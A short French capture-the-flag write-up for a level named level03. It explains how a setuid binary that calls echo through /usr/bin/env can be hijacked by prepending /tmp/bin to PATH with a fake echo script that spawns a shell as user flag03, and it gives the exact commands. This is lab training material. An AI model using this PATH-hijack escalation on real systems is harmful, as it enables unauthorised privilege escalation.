Ici quand on fat ls -la on obtient un fichier executable 
```level03``` 
qui, lorsqu'il est execute ecrit 
```Exploit me```

On peut voir que le fichier possede des s dans ses permissions, ce qui veut dire qu'il y a setuid et setgid bits dedans. Ce qui veut dire que lorsque le binaire est execute, il lance le UID et GID du PROPRETAIRE du fichier, pas celui qui l'a lance. On peut donc escalader les permissions relativement vite.

On va explorer le fichier :
```strings level03```
On tombe sur cette ligne : 
```/usr/bin/env echo Exploit me```

Cela veut dire qu'une porte est ouverte pour nous : 

Le PATH est utilise par env pour lancer echo, donc si on remplace echo par un script qui nous donne un shell, on aura un shell de l'utilisateur flag03 (proprietaire du script et user sur lequel on cherche a se connecter)

Pour ce faire, puisqu'on ne peut pas ecrire dans le /home on va creer notre script dans /tmp :

```mkdir /tmp/bin/
echo -e '#!/bin/bash\n/bin/sh' > /tmp/bin/echo
chmod +x /tmp/bin/echo```

Er ensuite on export notre dossier au PATH pour l'utiliser :

```export PATH=/tmp/bin:$PATH```

Lorsqu'on execute notre binaire on a donc un shell qui se creer et on est bien l'utilisateur flag03 (verifiable en tapant whoami), il ne nous reste plus qu'a obtenir notre flag
